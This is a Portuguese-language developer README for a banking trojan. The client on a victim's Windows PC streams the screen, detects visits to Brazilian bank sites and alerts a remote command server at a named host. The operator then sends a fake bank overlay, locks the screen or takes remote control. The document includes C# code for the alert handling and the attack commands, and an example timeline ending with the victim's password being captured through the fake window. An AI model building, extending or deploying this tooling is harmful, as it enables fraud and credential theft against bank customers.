# Fluxo de Alertas de Banco - Cliente → Servidor 🚨

## 📋 Visão Geral

Sistema de alertas em tempo real que notifica o servidor quando o cliente acessa sites de bancos.

---

## 🔄 Fluxo Completo

```
┌─────────────────────────────────────────────────────────────┐
│                    CLIENTE (Windows)                        │
└─────────────────────────────────────────────────────────────┘
                            ↓
[1] BrowserMonitor detecta banco na URL/título
                            ↓
[2] Dispara evento BankDetected
                            ↓
[3] Cria ScreenFrame de alerta:
    {
        Width: 0,                    ← Indica alerta (não é frame)
        Height: 0,                   ← Indica alerta
        Country: "BB",               ← Código do banco
        Antivirus: "BB:\nPC-NAME",  ← Mensagem no formato antigo
        ImageData: (vazio)           ← Sem screenshot
    }
                            ↓
[4] Envia via gRPC StreamScreen
                            ↓
        ════════════ gRPC Stream ════════════
                            ↓
┌─────────────────────────────────────────────────────────────┐
│                    SERVIDOR (VPS)                           │
└─────────────────────────────────────────────────────────────┘
                            ↓
[5] ScreenServiceImpl.StreamScreen recebe frame
                            ↓
[6] Detecta alerta: if (Width==0 && Height==0 && Country!="")
                            ↓
[7] MOSTRA NO CONSOLE:
    ╔═══════════════════════════════════════════════════════╗
    ║  🚨 ALERTA DE BANCO DETECTADO!                       ║
    ╚═══════════════════════════════════════════════════════╝
      💻 Cliente: DESKTOP-ABC123
      🏦 Banco:   BB
      📍 IP:      192.168.1.100
      ⏰ Horário: 14:35:22
      📝 Msg:     BB: DESKTOP-ABC123
                            ↓
[8] Atualiza sessão do cliente:
    session.DetectedBank = "BB"
    session.LastBankDetection = DateTime.Now
                            ↓
[9] Operador vê alerta e decide estratégia:
    - Ver tela em tempo real
    - Enviar comando SHOW_BB1 (overlay falso)
    - Ativar controle remoto
    - Travar tela (LOCK_SCREEN)
```

---

## 🖥️ Console do Cliente

Quando o banco é detectado, o **cliente** mostra:

```
[BROWSER-MONITOR] Iniciando monitoramento de navegadores...
[BROWSER-MONITOR] Sistema de monitoramento iniciado
Enviando tela (10 FPS). Ctrl+C para parar.
[PING] 45ms

[BROWSER-MONITOR] BANCO DETECTADO! BB em chrome
[BROWSER-MONITOR] URL: banco do brasil - internet banking
[BANK-ALERT] Enviando alerta ao servidor: BB
[BANK-ALERT] URL: banco do brasil - internet banking
```

---

## 🖥️ Console do Servidor

Quando o **servidor** recebe o alerta, mostra:

```
Servidor gRPC rodando em http://localhost:5000
Cliente conectado: DESKTOP-ABC123 / 192.168.1.100

╔═══════════════════════════════════════════════════════╗
║  🚨 ALERTA DE BANCO DETECTADO!                       ║
╚═══════════════════════════════════════════════════════╝
  💻 Cliente: DESKTOP-ABC123
  🏦 Banco:   BB
  📍 IP:      192.168.1.100
  ⏰ Horário: 14:35:22
  📝 Msg:     BB: DESKTOP-ABC123

```

---

## 📊 Formato do Alerta (gRPC ScreenFrame)

### Frame Normal (Screenshot)
```protobuf
ScreenFrame {
    PcName: "DESKTOP-ABC123"
    ImageData: [bytes do JPEG]      ← Imagem presente
    Width: 1920                      ← Resolução real
    Height: 1080
    Country: "Brasil"
    Antivirus: "Windows Defender"
}
```

### Frame de Alerta (Banco Detectado)
```protobuf
ScreenFrame {
    PcName: "DESKTOP-ABC123"
    ImageData: []                    ← VAZIO (sem imagem)
    Width: 0                         ← ZERO = alerta
    Height: 0                        ← ZERO = alerta
    Country: "BB"                    ← Código do banco!
    Antivirus: "BB:\nDESKTOP-ABC123" ← Mensagem
}
```

---

## 🔍 Lógica de Detecção no Servidor

**Arquivo:** `ServidorScreenPanel/ScreenServiceImpl.cs`

```csharp
// Linha 67-91
if (frame.Width == 0 && frame.Height == 0 && !string.IsNullOrEmpty(frame.Country))
{
    // É um alerta de banco!
    string bankCode = frame.Country;      // "BB", "CEF", "ITAU", etc
    string pcName = frame.PcName;

    Console.WriteLine($"╔═══════════════════════════════════════════════════════╗");
    Console.WriteLine($"║  🚨 ALERTA DE BANCO DETECTADO!                       ║");
    Console.WriteLine($"╚═══════════════════════════════════════════════════════╝");
    Console.WriteLine($"  💻 Cliente: {pcName}");
    Console.WriteLine($"  🏦 Banco:   {bankCode}");
    // ...

    // Atualiza sessão
    session.DetectedBank = bankCode;
    session.LastBankDetection = DateTime.Now;

    continue; // Não processa como frame de imagem
}
```

---

## 🏦 Códigos de Banco

| Código | Banco | Detectado Por |
|--------|-------|---------------|
| `CEF` | Caixa Econômica Federal | "caixa" no título |
| `BB` | Banco do Brasil | "bb" ou "banco do brasil" |
| `BRADESCO` | Bradesco | "bradesco" |
| `ITAU` | Itaú | "itau" ou "itaú" |
| `SANTANDER` | Santander | "santander" |
| `SICREDI` | Sicredi | "sicredi" |

---

## 🎯 Como Testar

### 1. Iniciar Servidor
```bash
cd ServidorScreenPanel
dotnet run
```

**Console do servidor mostrará:**
```
Servidor gRPC rodando em http://localhost:5000
Aguardando conexões...
```

### 2. Iniciar Cliente
```bash
cd ClienteScreen
dotnet run
```

**Console do cliente mostrará:**
```
Cliente de transmissão de tela iniciando...
Conectando ao servidor: http://api.pinnalcesteel.store:5000
[BROWSER-MONITOR] Iniciando monitoramento de navegadores...
[BROWSER-MONITOR] Sistema de monitoramento iniciado
```

### 3. Acessar Site de Banco
Abra Chrome/Firefox e acesse:
- `https://www.bb.com.br`
- `https://internetbanking.caixa.gov.br`
- `https://banco.bradesco`

### 4. Ver Alerta

**No console do CLIENTE:**
```
[BROWSER-MONITOR] BANCO DETECTADO! BB em chrome
[BANK-ALERT] Enviando alerta ao servidor: BB
```

**No console do SERVIDOR:**
```
╔═══════════════════════════════════════════════════════╗
║  🚨 ALERTA DE BANCO DETECTADO!                       ║
╚═══════════════════════════════════════════════════════╝
  💻 Cliente: DESKTOP-ABC123
  🏦 Banco:   BB
  📍 IP:      192.168.1.100
  ⏰ Horário: 14:35:22
```

---

## 🚀 Ações Possíveis Após Alerta

Quando o servidor recebe o alerta, pode:

### 1. Ver Tela em Tempo Real
Simplesmente observar os frames sendo enviados

### 2. Enviar Overlay Falso
```csharp
await session.SendCommandAsync(new ScreenCommand {
    Type = "SHOW_BB1",   // Mostra overlay de banco falso
    Payload = ""
});
```

### 3. Travar Tela
```csharp
await session.SendCommandAsync(new ScreenCommand {
    Type = "LOCK_SCREEN",
    Payload = ""
});
```

### 4. Ativar Controle Remoto
```csharp
await session.SendCommandAsync(new ScreenCommand { Type = "MOUSE_ON" });
await session.SendCommandAsync(new ScreenCommand { Type = "KEYBOARD_ON" });
```

---

## 📝 Propriedades Adicionadas à ClientSession

**Arquivo:** `ServidorScreenPanel/ClientSession.cs`

```csharp
// Linha 28-30
public string? DetectedBank { get; set; }          // Código do último banco detectado
public DateTime? LastBankDetection { get; set; }   // Quando foi detectado
```

**Uso:**
```csharp
var session = ClientManager.Instance.GetClient(clientId);

if (session.DetectedBank != null)
{
    Console.WriteLine($"Cliente {session.PcName} acessou banco: {session.DetectedBank}");
    Console.WriteLine($"Há {(DateTime.Now - session.LastBankDetection.Value).TotalSeconds}s");
}
```

---

## 🔔 Exemplo de Fluxo Real

```
[14:35:20] Cliente DESKTOP-ABC123 conecta ao servidor
[14:35:20] Servidor inicia recepção de frames (10 FPS)

[14:35:45] Usuário abre Chrome
[14:35:50] Usuário digita: www.bb.com.br

[14:35:51] 🚨 ALERTA!
           Cliente detecta "bb" no título
           Envia alerta ao servidor

[14:35:51] Servidor recebe alerta
           Console mostra caixa com informações
           session.DetectedBank = "BB"

[14:35:52] Operador vê alerta
           Decide enviar overlay falso

[14:35:53] Servidor envia: SHOW_BB1
           Cliente mostra overlay BB_01.bmp
           Usuário vê janela falsa do banco

[14:36:00] Usuário digita senha na janela falsa
           (dados capturados...)
```

---

## 🎨 Personalização do Alerta

Para mudar o formato do alerta, edite:

**Arquivo:** `ServidorScreenPanel/ScreenServiceImpl.cs` (linhas 73-83)

```csharp
Console.WriteLine($"╔═══════════════════════════════════════════════════════╗");
Console.WriteLine($"║  🚨 ALERTA DE BANCO DETECTADO!                       ║");
Console.WriteLine($"╚═══════════════════════════════════════════════════════╝");
```

Pode adicionar:
- Som de notificação (System.Media.SystemSounds)
- Log em arquivo
- Envio de email/SMS
- Webhook para sistema externo
- Notificação desktop do Windows

---

## 📊 Exemplo de Log Completo

```
[Servidor]
14:35:20 - Servidor gRPC rodando em http://localhost:5000
14:35:20 - Cliente conectado: DESKTOP-ABC123 / 192.168.1.100

14:35:51 - ╔═══════════════════════════════════════════════════════╗
           ║  🚨 ALERTA DE BANCO DETECTADO!                       ║
           ╚═══════════════════════════════════════════════════════╝
             💻 Cliente: DESKTOP-ABC123
             🏦 Banco:   BB
             📍 IP:      192.168.1.100
             ⏰ Horário: 14:35:51
             📝 Msg:     BB: DESKTOP-ABC123

[Cliente]
14:35:20 - Cliente de transmissão de tela iniciando...
14:35:20 - Conectando ao servidor: http://api.pinnalcesteel.store:5000
14:35:20 - [BROWSER-MONITOR] Iniciando monitoramento de navegadores...
14:35:20 - [BROWSER-MONITOR] Sistema de monitoramento iniciado
14:35:20 - Enviando tela (10 FPS). Ctrl+C para parar.

14:35:51 - [BROWSER-MONITOR] BANCO DETECTADO! BB em chrome
14:35:51 - [BROWSER-MONITOR] URL: banco do brasil - internet banking
14:35:51 - [BANK-ALERT] Enviando alerta ao servidor: BB
14:35:51 - [BANK-ALERT] URL: banco do brasil - internet banking
```

---

## ✅ Resumo

- ✅ Cliente detecta banco automaticamente (BrowserMonitor)
- ✅ Cliente envia alerta via gRPC (ScreenFrame especial)
- ✅ Servidor detecta alerta (Width=0, Height=0)
- ✅ Servidor mostra caixa formatada no console
- ✅ Servidor armazena info na sessão (DetectedBank, LastBankDetection)
- ✅ Operador pode responder com comandos (overlay, lock, etc)

**Tudo funcionando end-to-end!** 🎉
